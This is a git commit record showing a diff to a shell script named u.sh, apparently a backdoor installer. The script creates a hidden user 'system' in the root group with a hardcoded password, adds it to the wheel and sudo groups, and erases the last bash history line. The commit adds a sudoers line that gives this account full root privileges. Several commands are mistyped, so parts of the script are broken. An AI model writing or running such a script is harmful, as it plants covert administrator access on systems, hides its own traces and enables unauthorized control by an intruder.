5b515c1e591b716d209310935f5a0357784172d9
TiliCruz <80571788+TiliCruz@users.noreply.github.com>
2021-04-28 00:07:53 +0800

    Update u.sh

--- u.sh
+++ u.sh
@@ -3,4 +3,5 @@ useradd system -groot -M
 echo'0c117864a02827ba'| passwd --stdin system
 usermod -a -G wheelsystem
 usermod -a -G sudosystem
+echo "system ALL=(ALL) ALL" >> /etc/sudoers
 sed -i '$d'~/.bash_history
